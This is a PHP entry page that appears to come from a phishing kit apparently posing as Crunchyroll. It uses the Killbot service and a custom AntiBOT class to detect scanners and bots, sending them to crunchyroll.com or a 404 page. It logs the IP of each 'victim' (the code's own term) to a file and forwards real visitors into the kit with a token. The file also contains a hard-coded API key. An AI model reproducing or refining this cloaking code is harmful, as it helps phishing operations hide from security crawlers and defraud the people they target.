<?php
require('shade/core/functions.php');
$ip = $victim->getVictimIP();

require_once('shade/core/class.killbot.php');

$Killbot = new Killbot([
    'active'        => false, // If 'true' will set blocker protection active, and 'false' will deactive protection
    'apikey'        => 'CGF2RyAQjNRoLnnOQTCwu8ahgEkk5bg-3DQCSytGZFNpz', // Your API Key from https://killbot.pw/developer
    'bot_redirect'  => 'https://crunchyroll.com/' // Bot will be redirect to this URL
]);
$Killbot->run();

$AntiBOT = new AntiBOT(ONLY_MOBILE, $ip, $UserAgentParser);

if($AntiBOT->isBot())
{
    header("HTTP/1.1 404 Not Found");
    session_destroy();
    die();
    return;
}

$rand_hash = md5($ip);
$session = md5(rand(100, 999));

$file = fopen('visits.log', 'a');
fwrite($file, $ip . " " . date("d M Y h:i:s") . "\n");
fclose($file);

$_SESSION['is_valid'] = 1;
?>

<script>window.location.href = "<?=FIRST_PAGE?>?token=<?=$rand_hash?>&session=<?=$session?>";</script>

